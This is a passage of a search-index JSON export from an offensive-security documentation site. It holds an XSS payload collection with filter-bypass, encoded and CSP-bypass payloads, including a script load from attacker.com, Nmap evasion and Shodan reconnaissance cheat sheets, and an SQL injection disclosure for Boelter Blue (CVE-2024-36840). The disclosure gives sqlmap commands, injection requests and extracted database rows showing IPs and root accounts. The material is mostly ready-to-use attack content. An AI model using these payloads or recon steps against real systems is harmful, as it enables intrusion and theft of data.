Dorks","text":"<p>wqd</p>"},{"location":"payloads/web_exploits/xss/","title":"XSS Payload Collection","text":""},{"location":"payloads/web_exploits/xss/#overview","title":"Overview","text":"<p>Cross-Site Scripting (XSS) is a type of security vulnerability typically found in web applications. It allows attackers to inject malicious scripts into web pages viewed by other users. There are three main types of XSS attacks: Stored XSS, Reflected XSS, and DOM-based XSS. This page provides a comprehensive collection of XSS payloads for each type, including advanced and encrypted payloads for bypassing filters.</p>"},{"location":"payloads/web_exploits/xss/#stored-xss-payloads","title":"Stored XSS Payloads","text":""},{"location":"payloads/web_exploits/xss/#basic-payloads","title":"Basic Payloads","text":"<pre><code>&lt;script&gt;alert('XSS');&lt;/script&gt;\n&lt;script&gt;alert(document.cookie);&lt;/script&gt;\n&lt;img src=x onerror=alert('XSS')&gt;\n</code></pre>"},{"location":"payloads/web_exploits/xss/#advanced-payloads","title":"Advanced Payloads","text":"<pre><code>&lt;svg/onload=alert('XSS')&gt;\n&lt;body onload=alert('XSS')&gt;\n&lt;iframe src=\"javascript:alert('XSS');\"&gt;&lt;/iframe&gt;\n</code></pre>"},{"location":"payloads/web_exploits/xss/#event-handlers","title":"Event Handlers","text":"<pre><code>&lt;div onmouseover=\"alert('XSS')\"&gt;Hover over me!&lt;/div&gt;\n&lt;input type=\"text\" value=\"XSS\" onfocus=\"alert('XSS')\"&gt;\n&lt;a href=\"#\" onclick=\"alert('XSS')\"&gt;Click me&lt;/a&gt;\n</code></pre>"},{"location":"payloads/web_exploits/xss/#attribute-injection","title":"Attribute Injection","text":"<pre><code>&lt;math&gt;&lt;mtext&gt;&lt;malignmark&gt;&lt;mi&gt;&lt;audio autoplay onloadstart=alert('XSS')&gt;&lt;/audio&gt;\n&lt;xss style=\"xss:expression(alert('XSS'))\"&gt;\n&lt;marquee width=1 loop=1 scrollamount=1 onfinish=confirm(1)&gt;\n</code></pre>"},{"location":"payloads/web_exploits/xss/#filter-bypass-payloads","title":"Filter Bypass Payloads","text":""},{"location":"payloads/web_exploits/xss/#using-backticks","title":"Using Backticks","text":"<pre><code>&lt;IMG SRC=`javascript:alert(\"XSS\")`&gt;\n</code></pre>"},{"location":"payloads/web_exploits/xss/#using-data-uris","title":"Using Data URIs","text":"<pre><code>&lt;a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\"&gt;Click here&lt;/a&gt;\n</code></pre>"},{"location":"payloads/web_exploits/xss/#double-encoding","title":"Double Encoding","text":"<pre><code>%253Cscript%253Ealert('XSS')%253C%252Fscript%253E\n</code></pre>"},{"location":"payloads/web_exploits/xss/#encrypted-payloads","title":"Encrypted Payloads","text":""},{"location":"payloads/web_exploits/xss/#base64-encoding-with-execution","title":"Base64 Encoding with Execution","text":"<pre><code>&lt;iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\"&gt;&lt;/iframe&gt;\n</code></pre>"},{"location":"payloads/web_exploits/xss/#hex-encoding-with-execution","title":"Hex Encoding with Execution","text":"<pre><code>&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))&lt;/script&gt;\n</code></pre>"},{"location":"payloads/web_exploits/xss/#reflected-xss-payloads","title":"Reflected XSS Payloads","text":""},{"location":"payloads/web_exploits/xss/#basic-payloads_1","title":"Basic Payloads","text":"<pre><code>\"&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;\n\"&gt;&lt;img src=x onerror=alert('XSS')&gt;\n\"&gt;&lt;svg/onload=alert('XSS')&gt;\n</code></pre>"},{"location":"payloads/web_exploits/xss/#url-encoded-payloads","title":"URL Encoded Payloads","text":"<pre><code>%3Cscript%3Ealert('XSS')%3C/script%3E\n%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E\n%3Csvg%2Fonload%3Dalert('XSS')%3E\n</code></pre>"},{"location":"payloads/web_exploits/xss/#event-handlers_1","title":"Event Handlers","text":"<pre><code>\"&gt;&lt;div onmouseover=\"alert('XSS')\"&gt;Hover over me!&lt;/div&gt;\n\"&gt;&lt;input type=\"text\" value=\"XSS\" onfocus=\"alert('XSS')\"&gt;\n\"&gt;&lt;a href=\"#\" onclick=\"alert('XSS')\"&gt;Click me&lt;/a&gt;\n</code></pre>"},{"location":"payloads/web_exploits/xss/#dom-based-xss-payloads","title":"DOM-based XSS Payloads","text":""},{"location":"payloads/web_exploits/xss/#basic-payloads_2","title":"Basic Payloads","text":"<pre><code>document.write('&lt;script&gt;alert(\"XSS\")&lt;/script&gt;');\ndocument.body.innerHTML = '&lt;img src=x onerror=alert(\"XSS\")&gt;';\nlocation.hash = '\"&gt;&lt;script&gt;alert(\"XSS\")&lt;/script&gt;';\n</code></pre>"},{"location":"payloads/web_exploits/xss/#advanced-payloads_1","title":"Advanced Payloads","text":"<pre><code>location=\"javascript:alert('XSS')\";\nwindow.location = 'javascript:alert(\"XSS\")';\ndocument.location = 'javascript:alert(\"XSS\")';\n</code></pre>"},{"location":"payloads/web_exploits/xss/#event-handlers_2","title":"Event Handlers","text":"<pre><code>var x = document.createElement(\"div\");\nx.onmouseover = function() { alert('XSS'); };\ndocument.body.appendChild(x);\n\ndocument.getElementById('test').setAttribute('onmouseover', 'alert(\"XSS\")');\nelement.attachEvent('onclick', function(){ alert('XSS'); });\n</code></pre>"},{"location":"payloads/web_exploits/xss/#advanced-xss-payloads","title":"Advanced XSS Payloads","text":""},{"location":"payloads/web_exploits/xss/#polyglot-payloads","title":"Polyglot Payloads","text":"<pre><code>&lt;script src=//your.site/0&gt;&lt;/script&gt;\n\"&gt;&lt;script src=//your.site/0 onerror=eval(atob('ZG9jdW1lbnQud3JpdGUoJzxzY3JpcHQ+YWxlcnQoJ1hTUycpOzwvc2NyaXB0Pic='))&gt;&lt;/script&gt;\n</code></pre>"},{"location":"payloads/web_exploits/xss/#filter-bypass-techniques","title":"Filter Bypass Techniques","text":"<pre><code>&lt;IMG SRC=`javascript:alert(\"XSS\")`&gt;\n&lt;a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\"&gt;Click here&lt;/a&gt;\n%253Cscript%253Ealert('XSS')%253C%252Fscript%253E\n</code></pre>"},{"location":"payloads/web_exploits/xss/#payloads-for-specific-contexts","title":"Payloads for Specific Contexts","text":""},{"location":"payloads/web_exploits/xss/#json-context","title":"JSON Context","text":"<pre><code>{\"key\":\"&lt;script&gt;alert('XSS')&lt;/script&gt;\"}\n</code></pre>"},{"location":"payloads/web_exploits/xss/#xml-context","title":"XML Context","text":"<pre><code>&lt;foo&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/foo&gt;\n</code></pre>"},{"location":"payloads/web_exploits/xss/#svg-context","title":"SVG Context","text":"<pre><code>&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;\n</code></pre>"},{"location":"payloads/web_exploits/xss/#exploiting-csp-bypasses","title":"Exploiting CSP Bypasses","text":""},{"location":"payloads/web_exploits/xss/#exploiting-csp-with-jsonp","title":"Exploiting CSP with JSONP","text":"<pre><code>&lt;script src=\"https://trusted.com/resource?callback=alert(1)\"&gt;&lt;/script&gt;\n</code></pre>"},{"location":"payloads/web_exploits/xss/#exploiting-csp-with-dom-clobbering","title":"Exploiting CSP with DOM Clobbering","text":"<pre><code>&lt;object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\"&gt;&lt;/object&gt;\n</code></pre>"},{"location":"payloads/web_exploits/xss/#bypassing-input-sanitization","title":"Bypassing Input Sanitization","text":""},{"location":"payloads/web_exploits/xss/#null-byte-injection","title":"Null Byte Injection","text":"<pre><code>&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt; \n</code></pre>"},{"location":"payloads/web_exploits/xss/#breaking-out-of-tags","title":"Breaking Out of Tags","text":"<pre><code>\"&gt;&lt;img src=x onerror=alert('XSS');&gt;\n</code></pre>"},{"location":"payloads/web_exploits/xss/#chained-injection","title":"Chained Injection","text":"<pre><code>\"&gt;&lt;script src=https://attacker.com/xss.js&gt;&lt;/script&gt;\n</code></pre>"},{"location":"payloads/web_exploits/xss/#sandbox-escapes","title":"Sandbox Escapes","text":""},{"location":"payloads/web_exploits/xss/#bypassing-sandbox-with-postmessage","title":"Bypassing Sandbox with PostMessage","text":"<pre><code>&lt;iframe sandbox=\"allow-scripts\" srcdoc=\"&lt;script&gt;window.parent.postMessage('XSS','*')&lt;/script&gt;\"&gt;&lt;/iframe&gt;\n</code></pre>"},{"location":"payloads/web_exploits/xss/#exploiting-trusted-domains","title":"Exploiting Trusted Domains","text":"<pre><code>&lt;iframe src=\"https://trusted-domain.com\" onload=\"this.contentWindow.postMessage('&lt;script&gt;alert(1)&lt;/script&gt;', '*')\"&gt;&lt;/iframe&gt;\n</code></pre>"},{"location":"payloads/web_exploits/xss/#using-mutation-observers","title":"Using Mutation Observers","text":"<pre><code>var observer = new MutationObserver(function(mutations) {\n  mutations.forEach(function(mutation) {\n    if (mutation.addedNodes.length) {\n      var script = document.createElement('script');\n      script.innerHTML = 'alert(\"XSS\")';\n      document.body.appendChild(script);\n    }\n  });\n});\nobserver.observe(document, { childList: true, subtree: true });\ndocument.body.appendChild(document.createElement('div'));\n</code></pre>"},{"location":"payloads/web_exploits/xss/#bypassing-html-sanitizers","title":"Bypassing HTML Sanitizers","text":""},{"location":"payloads/web_exploits/xss/#using-angle-brackets","title":"Using Angle Brackets","text":"<pre><code>&lt;svg&gt;&lt;a xlink:href=\"javascript:alert(1)\"&gt;&amp;lt;click&amp;gt;&lt;/a&gt;&lt;/svg&gt;\n</code></pre>"},{"location":"payloads/web_exploits/xss/#exploiting-weak-sanitizers","title":"Exploiting Weak Sanitizers","text":"<pre><code>&lt;div&gt;&lt;iframe src=\"javascript:alert('XSS')\"&gt;&lt;/iframe&gt;&lt;/div&gt;\n</code></pre> <p>This XSS Payload Collection is part of CyberDepot, maintained by #AfterDark.</p>"},{"location":"reconnaissance/tools/nmap/","title":"Nmap Cheat Sheet for Penetration Testing","text":"<p>Nmap (Network Mapper) is a free and open source utility for network discovery and security auditing. It is used to discover hosts and services on a computer network, thus building a \"map\" of the network. Here's how to use Nmap effectively in penetration testing:</p>"},{"location":"reconnaissance/tools/nmap/#basic-scanning-techniques","title":"Basic Scanning Techniques","text":"<ul> <li>Scan a single IP or host</li> </ul> <p><code>nmap 192.168.1.1</code></p> <ul> <li>Scan a range of IPs</li> </ul> <p><code>nmap 192.168.1.1-20</code></p> <ul> <li>Scan a subnet</li> </ul> <p><code>nmap 192.168.1.0/24</code></p> <ul> <li>Scan for every TCP port (1-65535)</li> </ul> <p><code>nmap -p- 192.168.1.1</code></p> <ul> <li>Perform a fast scan</li> </ul> <p><code>nmap -T4 -F 192.168.1.1</code></p>"},{"location":"reconnaissance/tools/nmap/#service-and-os-detection","title":"Service and OS Detection","text":"<ul> <li>Detect OS and Services</li> </ul> <p><code>nmap -A 192.168.1.1</code></p> <ul> <li>Standard service detection</li> </ul> <p><code>nmap -sV 192.168.1.1</code></p>"},{"location":"reconnaissance/tools/nmap/#advanced-scanning","title":"Advanced Scanning","text":"<ul> <li>Use TCP SYN scan (root only)</li> </ul> <p><code>nmap -sS 192.168.1.1</code></p> <ul> <li>Use TCP connect scan (non-root)</li> </ul> <p><code>nmap -sT 192.168.1.1</code></p> <ul> <li>UDP scan</li> </ul> <p><code>nmap -sU -p 123,161,162 192.168.1.1</code></p> <ul> <li>SCTP INIT scan</li> </ul> <p><code>nmap -sY 192.168.1.1</code></p>"},{"location":"reconnaissance/tools/nmap/#stealth-and-evasion-techniques","title":"Stealth and Evasion Techniques","text":"<ul> <li>Fragment packets</li> </ul> <p><code>nmap -f 192.168.1.1</code></p> <ul> <li>Specify a custom MTU</li> </ul> <p><code>nmap --mtu 24 192.168.1.1</code></p> <ul> <li>Send bad checksums</li> </ul> <p><code>nmap --badsum 192.168.1.1</code></p> <ul> <li>Decoy scan</li> </ul> <p><code>nmap -D RND:10 [target]</code></p> <p><code>nmap -D decoy1,decoy2,ME,decoy3,decoy4 [target]</code></p>"},{"location":"reconnaissance/tools/nmap/#script-scanning","title":"Script Scanning","text":"<ul> <li>Using default safe scripts</li> </ul> <p><code>nmap -sC 192.168.1.1</code></p> <ul> <li>Script scanning with specific script</li> </ul> <p><code>nmap --script=ssl-heartbleed 192.168.1.1</code></p> <ul> <li>Script scanning with script arguments</li> </ul> <p><code>nmap --script=smb-check-vulns --script-args=unsafe=1 192.168.1.1</code></p>"},{"location":"reconnaissance/tools/nmap/#output-formats","title":"Output Formats","text":"<ul> <li>Save output to a file</li> </ul> <p><code>nmap -oN output.txt 192.168.1.1</code></p> <ul> <li>Output in all formats</li> </ul> <p><code>nmap -oA output 192.168.1.1</code></p> <ul> <li>Grepable output</li> </ul> <p><code>nmap -oG output.txt 192.168.1.1</code></p>"},{"location":"reconnaissance/tools/nmap/#additional-useful-commands","title":"Additional Useful Commands","text":"<ul> <li>Aggressive timing template</li> </ul> <p><code>nmap -T5 192.168.1.1</code></p> <ul> <li>Idle scan using a zombie host</li> </ul> <p><code>nmap -sI [zombie] 192.168.1.1</code></p> <ul> <li>IPv6 scanning</li> </ul> <p><code>nmap -6 [IPv6 address]</code></p>"},{"location":"reconnaissance/tools/nmap/#examples","title":"Examples","text":"<ul> <li>Basic host scan example</li> </ul> <p><code>nmap example.com</code></p> <ul> <li>Service detection example</li> </ul> <p><code>nmap -sV example.com</code></p> <ul> <li>OS and service detection example</li> </ul> <p><code>nmap -A example.com</code></p> <ul> <li>Decoy scan example</li> </ul> <p><code>nmap -D decoy1,decoy2,ME,decoy3,decoy4 example.com</code></p> <p>Script scan using specific scripts example</p> <p><code>nmap --script=ssl-heartbleed example.com</code></p> <p>This cheat sheet provides a foundation for using Nmap in penetration testing and security assessments, with detailed commands for various scanning scenarios. These commands can help you discover network vulnerabilities, audit network security, and perform reconnaissance tasks effectively.</p>"},{"location":"reconnaissance/tools/shodan/","title":"Shodan Cheat Sheet for Penetration Testing","text":"<p>Shodan is a search engine for Internet-connected devices. It can be used to discover which of your devices are connected to the Internet, where they are located, and who is using them. Here\u2019s how to use Shodan for penetration testing:</p>"},{"location":"reconnaissance/tools/shodan/#basic-commands","title":"Basic Commands","text":"<ul> <li>Search for devices using a simple query</li> <li><code>shodan search apache</code></li> <li>Count the number of results for a query</li> <li><code>shodan count microsoft iis 6.0</code></li> </ul>"},{"location":"reconnaissance/tools/shodan/#searching-by-filters","title":"Searching by Filters","text":"<p>Use filters to refine your searches: - City   - <code>shodan search city:\"Las Vegas\" apache</code> - Country   - <code>shodan search country:\"US\" camera</code> - Geo (latitude/longitude)   - <code>shodan search geo:\"50.3,8.25\"</code> - Hostname   - <code>shodan search hostname:\"example.com\"</code> - Net (network range)   - <code>shodan search net:192.168.0.0/24</code> - OS (operating system)   - <code>shodan search os:\"windows 7\"</code> - Port   - <code>shodan search port:80</code></p>"},{"location":"reconnaissance/tools/shodan/#advanced-search-techniques","title":"Advanced Search Techniques","text":"<ul> <li>Combine filters</li> <li><code>shodan search country:\"DE\" port:21 \"anonymous ftp\"</code></li> <li>Search for vulnerabilities</li> <li><code>shodan search vuln:cve-2019-11510</code></li> </ul>"},{"location":"reconnaissance/tools/shodan/#using-shodan-to-monitor-specific-systems-or-assets","title":"Using Shodan to Monitor Specific Systems or Assets","text":"<ul> <li>Set up alerts for specific terms</li> <li><code>shodan alert create \"Name of Alert\" \"port:22 country:US\"</code></li> <li>List all your created alerts</li> <li><code>shodan alert list</code></li> <li>Remove an alert</li> <li><code>shodan alert remove [ALERT ID]</code></li> </ul>"},{"location":"reconnaissance/tools/shodan/#command-line-interface-cli-features","title":"Command-line Interface (CLI) Features","text":"<ul> <li>Download search results</li> <li><code>shodan download myresults apache</code></li> <li>View downloaded data</li> <li><code>shodan parse --fields ip_str,port,org,hostnames myresults.json.gz</code></li> <li>Generate a report from downloaded data</li> <li><code>shodan stats --facets port:top10 myresults.json.gz</code></li> </ul>"},{"location":"reconnaissance/tools/shodan/#reconnaissance-on-companies-for-bug-bounties","title":"Reconnaissance on Companies for Bug Bounties","text":"<ul> <li>Identify technology footprint</li> <li><code>shodan search org:\"Example Company\"</code></li> <li>Find exposed databases</li> <li><code>shodan search org:\"Example Company\" product:\"MongoDB\"</code></li> <li>Locate vulnerable systems</li> <li><code>shodan search org:\"Example Company\" vuln:cve-2022-0001</code></li> <li>Monitor for new devices</li> <li><code>shodan alert create \"New Devices at Example Company\" \"org:'Example Company'\"</code></li> </ul>"},{"location":"reconnaissance/tools/shodan/#examples","title":"Examples","text":"<ul> <li>Basic device search example</li> <li><code>shodan search webcam</code></li> <li>Search for default passwords</li> <li><code>shodan search \"default password\"</code></li> <li>Search for specific CVE vulnerabilities</li> <li><code>shodan search cve:2021-44228</code></li> <li>Monitor network for new SSH services</li> <li><code>shodan alert create \"New SSH\" \"port:22\"</code></li> </ul>"},{"location":"reconnaissance/tools/shodan/#tips-for-advanced-shodan-queries","title":"Tips for Advanced Shodan Queries","text":"<ul> <li>Filter by SSL info</li> <li><code>shodan search ssl.cert.subject.cn:google</code></li> <li>Find devices based on their banner</li> <li><code>shodan search \"Server: Apache\"</code></li> </ul> <p>This cheat sheet provides a foundation for using Shodan in penetration testing and security assessments, with specific strategies for conducting company-specific reconnaissance for bug bounties.</p>"},{"location":"vuln_disclosures/vuln_boelter_blue/","title":"Multiple SQL Injection Vulnerabilities in Boelter Blue System Management v1.3","text":"<p>Discovered by: [CBKB] - DeadlyData, R4d1x Date: 2024-05-27 Affected Software: Boelter Blue System Management  CVE: CVE-2024-36840 Version: 1.3 Google Dork: \"Powered by Boelter Blue\" Vendor: Boelter Blue (boelter.com) Software Link: Google Play Store Tested on: Linux Debian 9 (stretch), Apache 2.4.25, MySQL &gt;= 5.0.12  </p>"},{"location":"vuln_disclosures/vuln_boelter_blue/#overview","title":"Overview","text":"<p>Boelter Blue System Management v1.3 has been found to contain multiple critical SQL injection vulnerabilities. These vulnerabilities allow attackers to execute arbitrary SQL queries, potentially leading to sensitive data exposure, unauthorized access, and complete control over the affected database.</p>"},{"location":"vuln_disclosures/vuln_boelter_blue/#affected-component","title":"Affected Component","text":"<p>news_details.php services.php location_details.php</p> <ul> <li>id parameter</li> <li>section parameter</li> </ul>"},{"location":"vuln_disclosures/vuln_boelter_blue/#poc-example","title":"PoC Example","text":"<p>SQLMap Injection:  <code>sqlmap -u \"https://www.example.com/news_details.php?id=10071\" --random-agent --dbms=mysql --dbs</code></p> <p>news_details.php?id parameter: <code>sqlmap -u \"https://www.example.com/news_details.php?id=10071\" --random-agent --dbms=mysql --threads=4 --dbs</code></p> <p>services.php?section parameter: <code>sqlmap -u \"https://www.example.com/services.php?section=5081\" --random-agent --tamper=space2comment --threads=8 --dbs</code></p> <p>location_details.php?id parameter: <code>sqlmap -u \"https://www.example.com/location_details.php?id=836\" --random-agent --dbms=mysql --dbs</code></p>"},{"location":"vuln_disclosures/vuln_boelter_blue/#injection-types","title":"Injection Types:","text":"<pre><code>Boolean-based blind\nParameter: id (GET)\nType: boolean-based blind\nTitle: AND boolean-based blind - WHERE or HAVING clause\nPayload: id=10071 AND 1452=1452\n\n\nTime-based blind\nParameter: id (GET)\nType: time-based blind\nTitle: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)\nPayload: id=10071 AND (SELECT 5588 FROM (SELECT(SLEEP(5)))UtkO)\n\nUnion-based injection\nParameter: id (GET)\nType: UNION query\nTitle: Generic UNION query (NULL) - 8 columns\nPayload: id=-5298 UNION ALL SELECT NULL,NULL,CONCAT(0x717a787671,0x4d7065654c5a5547576a676c6c4d676f574b475a504a5369644c636a57525a7478684c4f56676561,0x71767a7671),NULL,NULL,NULL,NULL,NULL-- -\n</code></pre>"},{"location":"vuln_disclosures/vuln_boelter_blue/#http-requests","title":"HTTP Requests:","text":"<pre><code>Boolean-based blind\n\n    GET /news_details.php?id=10071 AND 1452=1452 HTTP/1.1\n    Host: [target_website]\n    User-Agent: [Your User-Agent]\n    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n    Accept-Language: en-US,en;q=0.5\n    Accept-Encoding: gzip, deflate\n    Connection: keep-alive\n    Upgrade-Insecure-Requests: 1\n\n\nTime-based blind\n\n    GET /news_details.php?id=10071 AND (SELECT 5588 FROM (SELECT(SLEEP(5)))UtkO) HTTP/1.1\n    Host: [target_website]\n    User-Agent: [Your User-Agent]\n    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n    Accept-Language: en-US,en;q=0.5\n    Accept-Encoding: gzip, deflate\n    Connection: keep-alive\n    Upgrade-Insecure-Requests: 1\n\n\nUnion-based injection\n\n    GET /news_details.php?id=-5298 UNION ALL SELECT NULL,NULL,CONCAT(0x717a787671,0x4d7065654c5a5547576a676c6c4d676f574b475a504a5369644c636a57525a7478684c4f56676561,0x71767a7671),NULL,NULL,NULL,NULL,NULL-- - HTTP/1.1\n    Host: [target_website]\n    User-Agent: [Your User-Agent]\n    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n    Accept-Language: en-US,en;q=0.5\n    Accept-Encoding: gzip, deflate\n    Connection: keep-alive\n    Upgrade-Insecure-Requests: 1\n</code></pre>"},{"location":"vuln_disclosures/vuln_boelter_blue/#impact","title":"Impact","text":"<p>These vulnerabilities can be exploited to achieve the following:</p> <ul> <li>Data Exfiltration: Admin credentials, user email/password hashes, device hashes, user PII, purchase history, and database credentials.</li> <li>Remote Code Execution: Through execution of arbitrary SQL queries.</li> <li>Account Takeover: By retrieving and decrypting user credentials.</li> <li>Full Database Access: Ability to read, modify, and delete any data in the database.</li> </ul>"},{"location":"vuln_disclosures/vuln_boelter_blue/#technical-details","title":"Technical Details","text":""},{"location":"vuln_disclosures/vuln_boelter_blue/#database-information","title":"Database Information","text":"<p>DBMS: MySQL &gt;= 5.0.12 Web Server: Apache 2.4.25 Operating System: Linux Debian 9 (stretch)</p>"},{"location":"vuln_disclosures/vuln_boelter_blue/#extracted-databases","title":"Extracted Databases","text":"<pre><code>available databases [5]:\n[*] Anchor5Digital\n[*] information_schema\n[*] mysql\n[*] performance_schema\n[*] sys\n</code></pre>"},{"location":"vuln_disclosures/vuln_boelter_blue/#sample-extracted-data","title":"Sample Extracted Data","text":"<p>Database: Anchor5Digital</p> <p>Table: DatabaseConnection</p> <pre><code>+----+-----------------+--------------------------------------------------------+---------------+------------------------------------+----------+------------+----------------+\n| id | ip              | url                                                    | name          | mainURL                            | username | password   | displayName    |\n+----+-----------------+--------------------------------------------------------+---------------+------------------------------------+----------+------------+----------------+\n| 1  | 104.197.215.116 | /cloudsql/patrick-cudahy:us-central1:patrick-cudahy-db | PatrickCudahy | https://patrick-cudahy.appspot.com | root     | S0lu****   | Patrick cuda** |\n| 2  | 35.184.62.89    | /cloudsql/our-event-app:us-central1:oureventapp-db     | OurEventApp   | https://our-event-app.appspot.com  | root     | S0lu****   | OurEventApp    |\n+----+-----------------+--------------------------------------------------------+---------------+------------------------------------+----------+------------+----------------+\n</code></pre> <p>Table: Payment</p> <pre><code>+----------------+-------------+\n| Column         | Type        |\n+----------------+-------------+\n| type           | varchar(20) |\n| amount         | varchar(20) |\n| auth_code      | varchar(50) |\n| business_id    | int(11)     |\n| id             | int(11)     |\n| paymentDate    | varchar(50) |\n| people_id      | int(11)     |\n| processor      | varchar(20) |\n| transaction_id | varchar(30) |\n+----------------+-------------+\n</code></pre> <p>Table: system_user</p> <pre><code>+-----------+\n| Host      |\n+-----------+\n| %         |\n| 127.0.0.1 |\n| 127.0.0.1 |\n| ::1       |\n| localhost |\n| localhost |\n| localhost |\n| localhost |\n+-----------+\n\n+-----------------+\n| User            |\n+-----------------+\n| cloudsqlexport  |\n| cloudsqlimport  |\n| cloudsqlimport  |\n| cloudsqloneshot |\n| cloudsqlreplica |\n| root            |\n| root            |\n| root            |\n+-----------------+\n</code></pre>"},{"location":"vuln_disclosures/vuln_boelter_blue/#mitigation","title":"Mitigation","text":"<p>To mitigate these vulnerabilities, it is recommended to:</p> <ul> <li>Validate and Sanitize User Inputs: Ensure that all user-supplied data is properly validated and sanitized before being processed by the application.</li> <li>Use Parameterized Queries: Implement parameterized queries or prepared statements to prevent SQL injection.</li> <li>Implement a WAF: Deploy a Web Application Firewall to detect and block SQL injection attempts.</li> </ul>"},{"location":"vuln_disclosures/vuln_boelter_blue/#references","title":"References","text":"<ul> <li>Boelter Blue Homepage</li> <li>Google Play Store</li> <li>CVE - MITRE</li> </ul>"},{"location":"vuln_disclosures/vuln_boelter_blue/#disclosure-timeline","title":"Disclosure Timeline","text":"<ul> <li>2023: Vulnerabilities discovered by CBKB team.</li> <li>2023: Vendor notified.</li> <li>2024: Vendor notified.</li> <li>2024-05-27: Public disclosure and CVE request submitted.</li> <li>2024-06-4: RESERVED CVE By mitre</li> <li>2024-06-4: Exploit disclosed to exploit-db</li> <li>2024-06-4: Exploit disclosed to packetstorm</li> </ul>"},{"location":"vuln_disclosures/vuln_boelter_blue/#cve-information","title":"CVE Information","text":"<ul> <li>CVE ID: CVE-2024-36840</li> </ul>"},{"location":"vuln_disclosures/vuln_boelter_blue/#contact-information","title":"Contact Information","text":"<p>For any questions or concerns regarding this vulnerability, please contact us at: infosecdb@protonmail.com</p> <p>[CBKB]-   DeadlyData,  [CBKB]-   R4d1x</p>"}]}